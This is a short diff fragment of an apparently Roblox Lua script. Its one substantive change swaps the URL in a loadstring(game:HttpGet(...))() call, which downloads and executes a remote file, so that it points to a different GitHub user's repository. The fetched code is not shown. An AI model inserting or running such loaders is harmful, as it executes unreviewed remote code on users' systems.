@@ -87,5 +87,5 @@ CloseCallback = <function> - Function to execute when the window is closed.
 
 else
 print("sigma")
- loadstring(game:HttpGet('https://raw.githubusercontent.com/bigfatman813131/bigfatmanskibid/main/yeah.rizz'))()
+ loadstring(game:HttpGet('https://raw.githubusercontent.com/ben437/fat/main/yeah.rizz'))()
 end
